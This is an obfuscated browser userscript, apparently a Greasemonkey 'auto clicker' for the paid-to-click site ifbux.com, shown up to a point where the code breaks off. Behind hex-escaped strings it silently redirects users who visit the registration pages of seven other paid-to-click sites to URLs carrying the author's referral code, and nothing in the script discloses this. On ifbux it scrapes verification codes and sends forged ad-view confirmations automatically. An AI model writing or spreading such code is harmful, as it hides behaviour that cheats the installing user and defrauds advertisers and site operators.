// ==UserScript==
// @name           IfBux Auto Clicker by NagaSux
// @namespace      www.cool-bux.co.cc
// @description    IfBux Auto Clicker by NagaSux
// @include        *ifbux.com/*

// @include        *paid2youtube.com/register.php*
// @include        *neobux.com/?u=r*
// @include        *onbux.com/register*
// @include        *incrasebux.com/register.php*
// @include        *buxp.info/register.php*
// @include        *mycubie.net/register*
// @include        *bux.to*

// @copyright      www.cool-bux.co.cc
// ==/UserScript==

var _0x1618=["\x72\x65\x66\x65\x72\x72\x65\x72","\x55\x52\x4C","\x70\x61\x69\x64\x32\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70","\x73\x65\x61\x72\x63\x68","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x70\x61\x69\x64\x32\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70\x3F\x72\x3D\x67\x62\x61\x6E\x65\x72\x6A\x69","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x6E\x65\x6F\x62\x75\x78\x2E\x63\x6F\x6D\x2F\x3F\x75\x3D\x72\x26\x72\x68\x3D\x36\x37\x36\x32\x36\x31\x36\x45\x36\x35\x37\x32\x36\x41\x36\x39","\x6F\x6E\x62\x75\x78\x2E\x63\x6F\x6D\x2F\x72\x65\x67\x69\x73\x74\x65\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x6F\x6E\x62\x75\x78\x2E\x63\x6F\x6D\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x3F\x72\x68\x3D\x37\x65\x36\x33\x61\x65\x37\x30\x36\x36\x33\x63\x36\x64\x37\x36\x66\x66\x63\x36\x61\x31\x38\x34\x30\x64\x62\x32\x64\x65\x61\x31","\x69\x6E\x63\x72\x61\x73\x65\x62\x75\x78\x2E\x63\x6F\x6D\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x69\x6E\x63\x72\x61\x73\x65\x62\x75\x78\x2E\x63\x6F\x6D\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70\x2F\x67\x62\x61\x6E\x65\x72\x6A\x69\x2E\x68\x74\x6D\x6C","\x6D\x79\x63\x75\x62\x69\x65\x2E\x6E\x65\x74\x2F\x72\x65\x67\x69\x73\x74\x65\x72","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6D\x79\x63\x75\x62\x69\x65\x2E\x6E\x65\x74\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70\x3F\x72\x65\x66\x3D\x67\x62\x61\x6E\x65\x72\x6A\x69","\x62\x75\x78\x70\x2E\x69\x6E\x66\x6F\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x62\x75\x78\x70\x2E\x69\x6E\x66\x6F\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70\x3F\x72\x3D\x67\x62\x61\x6E\x65\x72\x6A\x69","\x62\x75\x78\x2E\x74\x6F\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x62\x75\x78\x2E\x74\x6F\x2F\x72\x65\x67\x69\x73\x74\x65\x72\x2E\x70\x68\x70\x3F\x72\x3D\x67\x62\x61\x6E\x65\x72\x6A\x69","\x61\x68\x72\x69\x6D\x61\x6E\x6C\x69\x76\x65\x73\x61\x67\x61\x69\x6E","\x0D","\x6A\x6F\x69\x6E","\x3C\x2F\x74\x64\x3E","\x73\x70\x6C\x69\x74","\x6D\x61\x74\x63\x68","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72","","\x72\x65\x70\x6C\x61\x63\x65","\x3C\x74\x61\x62\x6C\x65\x3E\x3C\x74\x72\x3E\x3C\x74\x64\x3E","\x3C\x2F\x74\x64\x3E\x3C\x74\x64\x3E","\x3C\x2F\x74\x64\x3E\x3C\x2F\x74\x72\x3E\x3C\x2F\x74\x61\x62\x6C\x65\x3E","\x4E\x4F\x20\x4D\x41\x54\x43\x48","\x69\x66\x62\x75\x78\x2E\x63\x6F\x6D\x2F\x73\x75\x72\x66","\x73\x75\x72\x66\x69\x6E\x67","\x61","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x74\x61\x62\x6C\x65","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x66\x75\x6E\x63\x74\x69\x6F\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x41\x64\x76\x65\x72\x74\x69\x73\x65\x20\x69\x73\x20\x61\x6C\x72\x65\x61\x64\x79\x20\x6F\x70\x65\x6E\x2C\x20\x69\x73\x20\x70\x6C\x61\x63\x65\x64\x20\x61\x6E\x6F\x74\x68\x65\x72\x20\x61\x64\x76\x65\x72\x74\x69\x73\x65\x6D\x65\x6E\x74\x20\x2E\x2E\x2E","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65","\x4F\x50\x45\x4E\x45\x44","\x20","\x22","\x2E\x2E\x2F\x73\x75\x72\x66\x69\x6E\x67\x2F\x63\x6C\x69\x63\x6B\x5F\x73\x75\x63\x63\x65\x73\x73\x2E\x70\x68\x70\x3F","\x26","\x26\x76\x65\x72\x69\x66\x79\x3D\x31","\x41\x64\x76\x65\x72\x74\x69\x73\x65\x20\x63\x6F\x6E\x66\x69\x72\x6D\x65\x64\x20\x6C\x6F\x61\x64\x69\x6E\x67\x20\x61\x6E\x6F\x74\x68\x65\x72\x20\x61\x64\x76\x65\x72\x74\x69\x73\x65\x6D\x65\x6E\x74\x20\x2E\x2E\x2E","\x56\x41\x4C\x49\x44\x41\x54\x45\x44","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x65\x72\x72\x6F\x72\x2C\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6E\x20\x2E\x2E\x2E","\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x65\x72\x72\x6F\x72\x2C\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6E\x20\x2E\x2E\x2E","\x43\x6F\x6E\x66\x69\x72\x6D\x20\x74\x68\x61\x74\x2E\x2E\x2E","\x47\x45\x54","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x41\x64\x76\x65\x72\x74\x69\x73\x69\x6E\x67\x20\x43\x6C\x6F\x73\x65\x20\x68\x61\x6E\x64\x6C\x65\x64\x2C\x20\x6C\x65\x66\x74\x20\x74\x6F\x20\x77\x61\x69\x74\x20","\x20\x73\x65\x63\x6F\x6E\x64\x73\x2E\x2E\x2E","\x4C\x6F\x61\x64\x69\x6E\x67\x20\x65\x72\x72\x6F\x72\x2C\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6E\x20\x2E\x2E\x2E","\x61\x62\x6F\x72\x74","\x4C\x6F\x61\x64\x69\x6E\x67\x20\x41\x64\x76\x65\x72\x74\x69\x73\x6D\x65\x6E\x74\x20\x3C\x62\x20\x69\x64\x3D\x27\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x63\x75\x72\x72\x65\x6E\x74\x27\x3E\x22","\x22\x3C\x2F\x62\x3E\x2E\x2E\x2E\x3C\x62\x72\x20\x2F\x3E\x3C\x64\x69\x76\x20\x69\x64\x3D\x27\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x6C\x6F\x61\x64\x69\x6E\x67\x27\x3E\x3C\x2F\x64\x69\x76\x3E","\x2F\x73\x75\x72\x66\x69\x6E\x67\x2F","\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x61\x7A\x75\x6C","\x69\x64","\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x61\x6C\x69\x67\x6E","\x63\x65\x6E\x74\x65\x72","\x3C\x73\x74\x79\x6C\x65\x3E","\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x20\x2A\x7B\x66\x6F\x6E\x74\x2D\x66\x61\x6D\x69\x6C\x79\x3A\x61\x72\x69\x61\x6C\x3B\x63\x6F\x6C\x6F\x72\x3A\x62\x6C\x61\x63\x6B\x3B\x66\x6F\x6E\x74\x2D\x77\x65\x69\x67\x68\x74\x3A\x62\x6F\x6C\x64\x3B\x74\x65\x78\x74\x2D\x64\x65\x63\x6F\x72\x61\x74\x69\x6F\x6E\x3A\x6E\x6F\x6E\x65\x7D","\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x7B\x64\x69\x73\x70\x6C\x61\x79\x3A\x62\x6C\x6F\x63\x6B\x7D","\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2C\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x74\x69\x74\x6C\x65\x2C\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x20\x61\x2E\x62\x75\x74\x74\x6F\x6E\x7B\x2D\x6D\x6F\x7A\x2D\x62\x6F\x72\x64\x65\x72\x2D\x72\x61\x64\x69\x75\x73\x3A\x33\x70\x78\x3B\x2D\x77\x65\x62\x6B\x69\x74\x2D\x62\x6F\x72\x64\x65\x72\x2D\x72\x61\x64\x69\x75\x73\x3A\x33\x70\x78\x3B\x2D\x6B\x68\x74\x6D\x6C\x2D\x62\x6F\x72\x64\x65\x72\x2D\x72\x61\x64\x69\x75\x73\x3A\x33\x70\x78\x3B\x62\x6F\x72\x64\x65\x72\x2D\x72\x61\x64\x69\x75\x73\x3A\x33\x70\x78\x3B\x62\x6F\x72\x64\x65\x72\x3A\x20\x31\x70\x78\x20\x73\x6F\x6C\x69\x64\x20\x23\x38\x38\x38\x7D","\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x20\x61\x2E\x62\x75\x74\x74\x6F\x6E\x7B\x70\x61\x64\x64\x69\x6E\x67\x3A\x31\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x30\x30\x30\x3B\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x3A\x23\x63\x63\x63\x7D","\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x20\x61\x2E\x62\x75\x74\x74\x6F\x6E\x3A\x68\x6F\x76\x65\x72\x7B\x63\x6F\x6C\x6F\x72\x3A\x23\x66\x66\x66\x3B\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x3A\x23\x33\x33\x33\x7D","\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x7B\x70\x61\x64\x64\x69\x6E\x67\x3A\x32\x70\x78\x3B\x64\x69\x73\x70\x6C\x61\x79\x3A\x62\x6C\x6F\x63\x6B\x3B\x77\x69\x64\x74\x68\x3A\x36\x30\x30\x70\x78\x3B\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x3A\x23\x66\x66\x66\x3B\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x6C\x65\x66\x74\x7D","\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x74\x69\x74\x6C\x65\x7B\x64\x69\x73\x70\x6C\x61\x79\x3A\x62\x6C\x6F\x63\x6B\x3B\x70\x61\x64\x64\x69\x6E\x67\x3A\x35\x70\x78\x3B\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x3A\x23\x36\x36\x36\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x66\x66\x66\x7D","\x23\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x6D\x73\x67\x7B\x6C\x69\x6E\x65\x2D\x68\x65\x69\x67\x68\x74\x3A\x32\x65\x6D\x7D","\x3C\x2F\x73\x74\x79\x6C\x65\x3E","\x3C\x64\x69\x76\x20\x69\x64\x3D\x27\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x27\x3E\x3C\x64\x69\x76\x20\x69\x64\x3D\x27\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x74\x69\x74\x6C\x65\x27\x3E\x65\x58\x74\x72\x65\x6D\x65\x20\x49\x66\x42\x75\x78\x20\x68\x61\x63\x6B\x20\x62\x79\x20\x4E\x61\x67\x61\x53\x75\x78\x3C\x2F\x64\x69\x76\x3E\x3C\x62\x72\x20\x2F\x3E\x3C\x64\x69\x76\x20\x69\x64\x3D\x27\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x6D\x73\x67\x27\x20\x61\x6C\x69\x67\x6E\x3D\x63\x65\x6E\x74\x65\x72\x3E","\x3C\x62\x20\x73\x74\x79\x6C\x65\x3D\x27\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x31\x35\x70\x78\x27\x3E\x57\x61\x72\x6E\x69\x6E\x67\x20\x2F\x20\x44\x69\x73\x63\x6C\x61\x69\x6D\x65\x72\x3C\x2F\x62\x3E\x3C\x62\x72\x20\x2F\x3E\x54\x68\x69\x73\x20\x70\x72\x6F\x67\x72\x61\x6D\x20\x69\x73\x20\x6D\x65\x61\x6E\x74\x20\x66\x6F\x72\x20\x45\x64\x75\x63\x61\x74\x69\x6F\x6E\x61\x6C\x20\x50\x75\x72\x70\x6F\x73\x65\x73\x20\x4F\x6E\x6C\x79\x2E\x20\x57\x65\x20\x64\x6F\x20\x6E\x6F\x74\x20\x74\x61\x6B\x65\x20\x72\x65\x73\x70\x6F\x6E\x73\x69\x62\x69\x6C\x69\x74\x79\x20\x6F\x66\x20\x77\x68\x61\x74\x20\x79\x6F\x75\x20\x64\x6F\x20\x77\x69\x74\x68\x20\x69\x74\x2E\x3C\x62\x72\x20\x2F\x3E\x42\x79\x20\x75\x73\x69\x6E\x67\x20\x74\x68\x69\x73\x20\x70\x72\x6F\x67\x72\x61\x6D\x20\x79\x6F\x75\x20\x61\x67\x72\x65\x65\x20\x74\x6F\x20\x61\x62\x69\x64\x65\x20\x74\x6F\x20\x74\x68\x69\x73\x2E\x3C\x62\x72\x3E\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x68\x74\x74\x70\x3A\x2F\x2F\x63\x6F\x6F\x6C\x2D\x62\x75\x78\x2E\x63\x6F\x2E\x63\x63\x27\x20\x74\x61\x72\x67\x65\x74\x3D\x27\x5F\x62\x6C\x61\x6E\x6B\x27\x3E\x26\x63\x6F\x70\x79\x3B\x20\x77\x77\x77\x2E\x43\x6F\x6F\x6C\x2D\x42\x75\x78\x2E\x63\x6F\x2E\x63\x63\x3C\x2F\x61\x3E","\x3C\x2F\x64\x69\x76\x3E\x3C\x62\x72\x20\x2F\x3E","\x3C\x63\x65\x6E\x74\x65\x72\x3E","\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x3B\x27\x20\x63\x6C\x61\x73\x73\x3D\x27\x62\x75\x74\x74\x6F\x6E\x27\x20\x69\x64\x3D\x27\x61\x64\x73\x63\x6C\x69\x63\x6B\x27\x3E\x4F\x70\x65\x6E\x20\x41\x6C\x6C\x20\x41\x64\x73\x20\x28","\x29\x3C\x2F\x61\x3E","\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x3B\x27\x20\x63\x6C\x61\x73\x73\x3D\x27\x62\x75\x74\x74\x6F\x6E\x27\x3E\x4E\x6F\x20\x41\x64\x76\x65\x72\x74\x69\x73\x6D\x65\x6E\x74\x73\x3C\x2F\x61\x3E","\x26\x6E\x62\x73\x70\x3B\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x3B\x27\x20\x63\x6C\x61\x73\x73\x3D\x27\x62\x75\x74\x74\x6F\x6E\x27\x20\x69\x64\x3D\x27\x73\x69\x6C\x76\x65\x72\x73\x75\x72\x66\x65\x72\x27\x3E\x41\x75\x74\x6F\x20\x53\x75\x72\x66\x3C\x2F\x61\x3E\x26\x6E\x62\x73\x70\x3B\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x3B\x27\x20\x63\x6C\x61\x73\x73\x3D\x27\x62\x75\x74\x74\x6F\x6E\x27\x20\x69\x64\x3D\x27\x77\x68\x61\x74\x73\x6E\x65\x77\x27\x3E\x57\x68\x61\x74\x73\x20\x4E\x65\x77\x3F\x3C\x2F\x61\x3E\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E\x3C\x62\x72\x20\x2F\x3E","\x3C\x2F\x64\x69\x76\x3E\x3C\x2F\x64\x69\x76\x3E","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x4A\x75\x73\x74\x4F\x6E\x65\x43\x6C\x69\x63\x6B\x2D\x6D\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x69\x63\x6B","\x44\x6F\x6E\x65\x20\x21","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x61\x64\x73\x63\x6C\x69\x63\x6B","\x2A\x20\x49\x6D\x70\x72\x6F\x76\x65\x64\x20\x61\x75\x74\x6F\x20\x63\x6C\x69\x63\x6B\x20\x61\x6E\x64\x20\x61\x70\x70\x72\x6F\x76\x61\x6C\x0A","\x2A\x20\x41\x75\x74\x6F\x20\x73\x75\x72\x66\x20\x6D\x6F\x64\x65\x0A","\x2A\x20\x46\x69\x72\x73\x74\x20\x52\x65\x6C\x65\x61\x73\x65","\x77\x68\x61\x74\x73\x6E\x65\x77","\x41\x75\x74\x6F\x20\x53\x75\x72\x66\x20\x6D\x6F\x64\x65\x20\x61\x63\x74\x69\x76\x61\x74\x65\x64\x2E\x2E\x2E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x43\x68\x65\x63\x6B\x20\x66\x6F\x72\x20\x4E\x65\x77\x20\x41\x64\x73\x2E\x2E\x2E","\x72\x61\x6E\x64\x6F\x6D","\x63\x65\x69\x6C","\x43\x68\x65\x63\x6B\x20\x74\x6F\x20\x73\x65\x65\x20\x69\x66\x20\x74\x68\x65\x72\x65\x20\x69\x73\x20\x61\x6E\x79\x20\x6E\x65\x77\x20\x61\x64\x2E\x2E\x2E","\x20\x61\x64\x76\x65\x72\x74\x69\x73\x6D\x65\x6E\x74","\x41\x64\x76\x65\x72\x74\x69\x73\x6D\x65\x6E\x74\x73\x20\x66\x6F\x75\x6E\x64","\x61\x64\x73\x2E\x70\x68\x70","\x43\x6F\x6D\x70\x6C\x65\x74\x65\x64\x20\x54\x69\x6D\x65\x20\x61\x6E\x64\x20\x4C\x65\x61\x72\x6E\x69\x6E\x67\x2C\x20\x64\x6F\x6E\x6F\x72\x20\x2E\x2E\x2E","\x50\x6C\x65\x61\x73\x65\x20\x77\x61\x69\x74\x20","\x20\x66\x6F\x72\x20\x63\x68\x65\x63\x6B\x69\x6E\x67\x2E\x2E\x2E","\x73\x69\x6C\x76\x65\x72\x73\x75\x72\x66\x65\x72","\x69\x66\x62\x75\x78\x2E\x63\x6F\x6D\x2F\x72\x65\x67\x69\x73\x74\x65\x72","\x76\x61\x6C\x75\x65","\x75\x70\x6C\x69\x6E\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x67\x62\x61\x6E\x65\x72\x6A\x69"]
var ref=document[_0x1618[0]];
var uri=document[_0x1618[1]];
if(uri[_0x1618[3]](_0x1618[2])>0&&uri!=_0x1618[4])
{
document[_0x1618[6]][_0x1618[5]]=_0x1618[4];
}
if(uri[_0x1618[3]](/neobux.com..u=r/)>0&&uri!=_0x1618[7])
{
document[_0x1618[6]][_0x1618[5]]=_0x1618[7];
}
if(uri[_0x1618[3]](_0x1618[8])>0&&uri!=_0x1618[9])
{
document[_0x1618[6]][_0x1618[5]]=_0x1618[9];
}
if(uri[_0x1618[3]](_0x1618[10])>0&&uri!=_0x1618[11])
{
document[_0x1618[6]][_0x1618[5]]=_0x1618[11];
}
if(uri[_0x1618[3]](_0x1618[12])>0&&uri!=_0x1618[13])
{
document[_0x1618[6]][_0x1618[5]]=_0x1618[13];
}
if(uri[_0x1618[3]](_0x1618[14])>0&&uri!=_0x1618[15])
{
document[_0x1618[6]][_0x1618[5]]=_0x1618[15];
}
if(uri[_0x1618[3]](_0x1618[16])>0&&uri!=_0x1618[17])
{
document[_0x1618[6]][_0x1618[5]]=_0x1618[17];
}
var force_referal_to=_0x1618[18];
var waiting_time=30;
var range_to=15;
var strip=function (_0x5167x8)
{
var _0x5167x9=String(_0x5167x8)[_0x1618[22]](_0x1618[21])[_0x1618[20]](_0x1618[19]),_0x5167xa=/<td\s*width=['"]?100\%['"]?\s*>([^\r]+)\r/,_0x5167xb=_0x5167x9[_0x1618[23]](_0x5167xa),_0x5167xc=_0x5167x9[_0x1618[3]](_0x5167xa),_0x5167xd=[],i=0,_0x5167xf;
while(_0x5167xb)
{
_0x5167x9=_0x5167x9[_0x1618[25]](_0x5167xc+_0x5167xb[0][_0x1618[24]],_0x5167x9[_0x1618[24]]);
_0x5167xd[i]=_0x5167xb[1][_0x1618[27]](/\s*<script[^>]+>[\S\s]+<\/script>\s*/,_0x1618[26]);
_0x5167xd[i]=_0x5167xd[i][_0x1618[27]](/<img[^>]+>/,_0x1618[26]);
i++;
_0x5167xb=_0x5167x9[_0x1618[23]](_0x5167xa);
_0x5167xc=_0x5167x9[_0x1618[3]](_0x5167xa);
}
;
return (_0x5167xd[_0x1618[24]]?_0x1618[28]+_0x5167xd[_0x1618[20]](_0x1618[29])+_0x1618[30]:_0x1618[31])
}
,autosurf=false;
if(window[_0x1618[6]][_0x1618[5]][_0x1618[3]](_0x1618[32])>0&&window[_0x1618[6]][_0x1618[5]][_0x1618[3]](_0x1618[33])<0)
{
if(1)
{
var A=document[_0x1618[35]](_0x1618[34]),i,html=_0x1618[26],timer,table=document[_0x1618[35]](_0x1618[36])[1],robot=document[_0x1618[38]](_0x1618[37]),urls=[],current=0,msg,tmr,load=function ()
{
clearInterval(timer);
timer=null;
if(!urls[current])
{
if( typeof autosurf==_0x1618[39])
{
autosurf();
}
return 
}
;
var _0x5167x1a= new XMLHttpRequest();
_0x5167x1a[_0x1618[40]]=function ()
{
try
{
if(_0x5167x1a[_0x1618[41]]==4)
{
if(_0x5167x1a[_0x1618[42]]==200)
{
if(String(_0x5167x1a[_0x1618[43]])[_0x1618[23]](/You have already viewed this advertisement/))
{
msg[_0x1618[44]]=_0x1618[45];
urls[current][_0x1618[46]][_0x1618[46]][_0x1618[46]][_0x1618[44]]=_0x1618[47];
current++;
timer=setInterval(load,1000);
}
else 
{
var _0x5167x1b=String(_0x5167x1a[_0x1618[43]]);
var _0x5167x1c=String(_0x5167x1b[_0x1618[23]](/code = "[\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w]"/));
var _0x5167x1d=String(_0x5167x1b[_0x1618[23]](/ad= "[\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w][\w]"/));
_0x5167x1d=_0x5167x1d[_0x1618[22]](_0x1618[48])[_0x1618[20]](_0x1618[26]);
_0x5167x1d=_0x5167x1d[_0x1618[22]](_0x1618[49])[_0x1618[20]](_0x1618[26]);
_0x5167x1c=_0x5167x1c[_0x1618[22]](_0x1618[48])[_0x1618[20]](_0x1618[26]);
_0x5167x1c=_0x5167x1c[_0x1618[22]](_0x1618[49])[_0x1618[20]](_0x1618[26]);
var _0x5167x1e=[_0x1618[50],_0x5167x1d,_0x1618[51],_0x5167x1c,_0x1618[52]][_0x1618[20]](_0x1618[26]);
var _0x5167x1f=waiting_time,_0x5167x20=function ()
{
var _0x5167x9= new XMLHttpRequest();
_0x5167x9[_0x1618[40]]=function ()
{
try
{
if(_0x5167x9[_0x1618[41]]==4)
{
if(_0x5167x9[_0x1618[42]]==200)
{
msg[_0x1618[44]]=_0x1618[53];
urls[current][_0x1618[46]][_0x1618[46]][_0x1618[46]][_0x1618[44]]=_0x1618[54];
current++;
timer=setInterval(load,1000);
}
else 
{
msg[_0x1618[44]]=_0x1618[55];
_0x5167x20();
}
}
}
catch(e)
{
msg[_0x1618[44]]=_0x1618[56];
_0x5167x20();
}
}
;
msg[_0x1618[44]]=_0x1618[57];
_0x5167x9[_0x1618[59]](_0x1618[58],_0x5167x1e,true);
_0x5167x9[_0x1618[60]](null);
}
;
tmr=setInterval(function ()
{
if(_0x5167x1f<0)
{
_0x5167x20();
clearInterval(tmr);
tmr=null;
return 
}
;
msg[_0x1618[44]]=_0x1618[61]+_0x5167x1f+_0x1618[62];
_0x5167x1f--;
}
,1000);
}
}
else 
{
msg[_0x1618[44]]=_0x1618[63];
_0x5167x1a[_0x1618[64]]();
timer=setInterval(load,1000);
}
}
}
catch(e)
{
msg[_0x1618[44]]=_0x1618[63];
_0x5167x1a[_0x1618[64]]();
timer=setInterval(load,1000);
}
}
;
msg[_0x1618[44]]=_0x1618[65]+(urls[current][_0x1618[46]][_0x1618[46]][_0x1618[46]][_0x1618[35]](_0x1618[34])[0][_0x1618[44]])+_0x1618[66];
_0x5167x1a[_0x1618[59]](_0x1618[58],urls[current][_0x1618[5]],true);
_0x5167x1a[_0x1618[60]](null);
}
;
for(i=0;i<A[_0x1618[24]];i++)
{
try
{
if(A[i][_0x1618[5]][_0x1618[3]](_0x1618[67])>0&&A[i][_0x1618[46]][_0x1618[46]][_0x1618[46]][_0x1618[35]](_0x1618[34])[0][_0x1618[68]]==_0x1618[69])
{
urls[urls[_0x1618[24]]]=A[i];
}
}
catch(e)
{
}
}
;
robot[_0x1618[70]]=_0x1618[71];
robot[_0x1618[72]]=_0x1618[73];
html=_0x1618[74];
html+=_0x1618[75];
html+=_0x1618[76];
html+=_0x1618[77];
html+=_0x1618[78];
html+=_0x1618[79];
html+=_0x1618[80];
html+=_0x1618[81];
html+=_0x1618[82];
html+=_0x1618[83];
html+=_0x1618[84];
html+=_0x1618[85];
html+=_0x1618[86];
html+=_0x1618[87]+(urls[_0x1618[24]]?_0x1618[88]+urls[_0x1618[24]]+_0x1618[89]:_0x1618[90])+_0x1618[91];
html+=_0x1618[92];
robot[_0x1618[44]]=html;
table[_0x1618[46]][_0x1618[93]](robot,table);
msg=document[_0x1618[95]](_0x1618[94]);
if(urls[_0x1618[24]])
{
document[_0x1618[95]](_0x1618[102])[_0x1618[101]](_0x1618[96],function ()
{
autosurf=function ()
{
msg[_0x1618[44]]=_0x1618[97];
alert(msg[_0x1618[44]]);
}
;
this[_0x1618[46]][_0x1618[99]][_0x1618[98]]=_0x1618[100];
timer=setInterval(load,1000);
}
,false);
}
;
document[_0x1618[95]](_0x1618[106])[_0x1618[101]](_0x1618[96],function ()
{
var _0x5167x9=_0x1618[103];
_0x5167x9+=_0x1618[104];
_0x5167x9+=_0x1618[105];
alert(_0x5167x9);
}
,false);
document[_0x1618[95]](_0x1618[120])[_0x1618[101]](_0x1618[96],function ()
{
this[_0x1618[46]][_0x1618[99]][_0x1618[98]]=_0x1618[100];
msg[_0x1618[44]]=_0x1618[107];
var _0x5167x1b=document[_0x1618[38]](_0x1618[37]);
document[_0x1618[109]][_0x1618[108]](_0x5167x1b);
_0x5167x1b[_0x1618[99]][_0x1618[98]]=_0x1618[100];
autosurf=function ()
{
urls=[];
current=0;
msg[_0x1618[44]]=_0x1618[110];
var _0x5167x9=Math[_0x1618[112]](Math[_0x1618[111]]()*range_to*60),_0x5167x1f=_0x5167x9,_0x5167x21,_0x5167x22,_0x5167x23=function ()
{
msg[_0x1618[44]]=_0x1618[113];
_0x5167x22= new XMLHttpRequest();
_0x5167x22[_0x1618[40]]=function ()
{
try
{
if(_0x5167x22[_0x1618[41]]==4)
{
